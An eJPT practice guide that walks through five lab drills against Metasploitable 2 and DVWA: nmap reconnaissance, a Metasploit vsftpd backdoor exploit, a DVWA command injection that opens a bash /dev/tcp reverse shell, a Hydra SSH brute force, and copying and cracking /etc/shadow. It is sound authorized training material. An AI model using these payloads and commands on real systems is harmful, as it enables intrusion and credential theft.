# Practice Scenarios

> `01-Fundamentals/eJPT` · labs — INE-Cybersecurity-Certifications-Guide

Five guided, **scan-to-shell style drills** against your own lab. They are ordered by
difficulty and each one ends with a checklist of concrete outcomes. Do them in order,
then re-run them from memory and time-box yourself.

**Shared lab (from `lab-setup-guide.md`)** — adjust IPs to yours:

```text
Kali attacker (host-only):   192.168.56.10   (example)
Metasploitable 2:            192.168.56.101  (example)
DVWA (Docker on Kali or VM): http://192.168.56.102/dvwa/  or http://127.0.0.1/
```

Rule: attack **only these VMs**. Restore the clean snapshot before repeating a drill.

## Scenario 1 — Baseline reconnaissance drill

- **Goal:** produce a complete, evidence-backed inventory of Metasploitable 2 *without
  exploiting anything*.
- **Steps:**

```bash
# 1. Discover the lab hosts
sudo nmap -sn 192.168.56.0/24 -oG ping.gnmap
grep "Status: Up" ping.gnmap | cut -d " " -f 2

# 2. Full TCP scan of the target, saved for evidence
sudo nmap -sS -p- -T4 --min-rate 1000 --open 192.168.56.101 -oA fulltcp

# 3. Version + default scripts on the open ports
sudo nmap -sV -sC -p 21,22,80,139,445,3306 192.168.56.101 -oA sv
```

- **Expected outcome:** you can list every open TCP port, its service, and its version
  from your saved files — e.g., FTP (vsftpd 2.3.4), SSH (OpenSSH), HTTP (Apache),
  SMB (Samba), MySQL, distcc, UnrealIRCd.
- **Checklist:**
  - [ ] I produced `ping.gnmap` and can extract live IPs from it.
  - [ ] My full TCP scan finished and is saved with `-oA`.
  - [ ] I can name at least six open services with their versions.
  - [ ] I explained in my notes why each service might be interesting.

## Scenario 2 — Exploit a service with Metasploit (vsftpd backdoor)

- **Goal:** turn the FTP banner from Scenario 1 into a root shell on Metasploitable 2.
- **Environment:** Kali + Metasploitable 2; FTP port 21 open.
- **Steps:**

```text
# 1. Start the DB and console
sudo systemctl start postgresql && sudo msfdb init
msfconsole -q

# 2. Find and load the module for the FTP version you enumerated
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > info
msf6 exploit(...) > set RHOSTS 192.168.56.101

# 3. Run it — this module yields a shell directly (no payload to set)
msf6 exploit(...) > run

# 4. Confirm who you are, then background the session
shell> id
shell> whoami
shell> ^Z     # background (or type 'background' inside meterpreter)
msf6 > sessions -l
```

- **Expected outcome:** `run` reports a shell opened; `id` shows you are `root`.
- **Checklist:**
  - [ ] I can justify the module choice from my Scenario 1 evidence (service + version).
  - [ ] I obtained a session and confirmed `root` with `id`.
  - [ ] I backgrounded the session and listed it with `sessions -l`.
  - [ ] I restored the snapshot afterward so the lab is clean again.

## Scenario 3 — Web command injection to a reverse shell (DVWA)

- **Goal:** go from a web page to a reverse shell on your DVWA host.
- **Environment:** Kali listener + DVWA (login `admin`/`password`, security level *low*).
- **Steps:**

```bash
# 1. Login to DVWA and keep the session cookie
curl -s -c dvwa.cookies -d "username=admin&password=password&Login=Login" \
     http://192.168.56.102/dvwa/login.php

# 2. Verify command injection works (look for ping output in the response)
curl -s -b dvwa.cookies \
     --data-urlencode "ip=127.0.0.1; whoami" \
     --data "Submit=Submit" \
     http://192.168.56.102/dvwa/vulnerabilities/exec/

# 3. Attacker: start a listener on Kali
nc -lvnp 4444

# 4. Trigger a reverse shell (bash /dev/tcp — no netcat needed on the target)
curl -s -b dvwa.cookies \
     --data-urlencode "ip=127.0.0.1; bash -i >& /dev/tcp/192.168.56.10/4444 0>&1" \
     --data "Submit=Submit" \
     http://192.168.56.102/dvwa/vulnerabilities/exec/

# 5. Upgrade the raw shell to a PTY on the attacker side
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl+Z, type:  stty raw -echo ; fg
```

- **Expected outcome:** you see the ping output including your injected command, then a
  reverse shell lands on the listener where `id` works.
- **Checklist:**
  - [ ] I logged in to DVWA with curl and reused the session cookie.
  - [ ] I confirmed injection with a harmless command (`whoami`).
  - [ ] I caught a reverse shell on my `nc` listener.
  - [ ] I upgraded the shell to a usable PTY.
  - [ ] I understand *why* `&`, `>`, and spaces were URL-encoded.

## Scenario 4 — Password attack with Hydra (SSH)

- **Goal:** find a valid SSH credential on Metasploitable 2 with a dictionary attack.
- **Environment:** Kali + Metasploitable 2 (port 22 open); wordlist on Kali.
- **Steps:**

```bash
# 1. Decompress the standard wordlist if needed
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz   # creates rockyou.txt

# 2. Try one known user (the box documents msfadmin; it is also in rockyou)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
      ssh://192.168.56.101 -t 4 -f

# 3. Log in with the discovered credential
ssh msfadmin@192.168.56.101
# password: msfadmin
```

- **Expected outcome:** Hydra reports `[22][ssh] host: 192.168.56.101 login: msfadmin
  password: msfadmin`; SSH login succeeds.
- **Checklist:**
  - [ ] I can explain why the attack is fast and why `-t 4` limits parallel tasks.
  - [ ] I verified SSH was open and reachable before attacking.
  - [ ] I logged in with the credential Hydra found.
  - [ ] I understand this is authorized practice on my own VM only.

## Scenario 5 — Post-exploitation and credential cracking

- **Goal:** from a foothold, collect system information and crack a password hash.
- **Environment:** reuse Scenario 2's root shell, or SSH as `msfadmin` (which can
  `sudo` without a password on Metasploitable 2).
- **Steps:**

```bash
# 1. Basic system recon
id; hostname; uname -a
cat /etc/passwd | head -20
sudo -l
find / -perm -4000 -type f 2>/dev/null | head -20     # SUID binaries

# 2. Collect hashes (as root / via sudo)
cp /etc/passwd /tmp/passwd && cp /etc/shadow /tmp/shadow

# 3. On Kali: combine and crack (attacker side)
unshadow /tmp/passwd /tmp/shadow > /tmp/hashes.txt    # pull files first if needed
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
john --show /tmp/hashes.txt
```

To pull files from a meterpreter session instead: `download /etc/shadow /root/loot/`.

- **Expected outcome:** you can list users and SUID binaries, and John cracks the
  `msfadmin` hash to `msfadmin` (documented default), proving the hash-cracking loop
  works.
- **Checklist:**
  - [ ] I collected `passwd`, `shadow`, user list, and SUID binaries as evidence.
  - [ ] I moved the files from target to Kali and ran `unshadow`.
  - [ ] John the Ripper cracked at least one hash from my rockyou wordlist.
  - [ ] I wrote a short findings note for this "engagement".

## Going further

Chain the scenarios into one full run: recon (S1) → exploit (S2 or S4) → post-exploit
(S5) → pivot. For pivoting practice, add a second isolated host-only network behind a
"pivot" VM and reach it through `route add` / `autoroute` in Metasploit or a
`proxychains` SOCKS tunnel — see `methodology/05-pivoting.md`.

## Common mistakes & tips

- **Skipping Scenario 1 evidence.** Every later choice (module, wordlist, payload)
  should be justified by what you enumerated.
- **Wrong IPs between scenarios.** Scenario 3's shell dials *your* Kali IP — write it
  down before starting the listener.
- **DVWA at higher security level.** The exercises assume *low* security; change it in
  DVWA Security before starting.
- **Forgetting the listener.** Start `nc -lvnp 4444` *before* triggering the payload.
- **Not URL-encoding injections.** Spaces, `&`, and `>` break in a URL — use
  `--data-urlencode`.
- **Reusing dirty VMs.** Restore the clean snapshot between scenarios; results become
  unpredictable otherwise.
- **Stopping after the shell.** The drill is complete when you have evidence and notes,
  not when you see `root@`.

## Checklist / Self-test

- [ ] Scenario 1: I produced a saved, version-annotated port inventory.
- [ ] Scenario 2: I obtained a root shell via a Metasploit exploit matched to the service.
- [ ] Scenario 3: I converted web command injection into a reverse shell.
- [ ] Scenario 4: I ran a dictionary attack and logged in with the found credential.
- [ ] Scenario 5: I collected post-exploitation evidence and cracked a hash with John.
- [ ] I can re-run every scenario after a clean snapshot **without** opening this file.
- [ ] I keep per-scenario notes with commands, outputs, and credentials.
- [ ] I never attacked anything outside my own lab network.

## Further resources

- Metasploitable 2 project page: <https://sourceforge.net/projects/metasploitable/>
- DVWA project and setup: <https://github.com/digininja/DVWA>
- Hydra (THC) documentation: <https://github.com/vanhauser-thc/thc-hydra>
- John the Ripper documentation: <https://www.openwall.com/john/doc/>
- OWASP Testing Guide (web checks): <https://owasp.org/www-project-web-security-testing-guide/>
- Authorized practice platforms: <https://www.vulnhub.com/> · <https://www.tryhackme.com/>
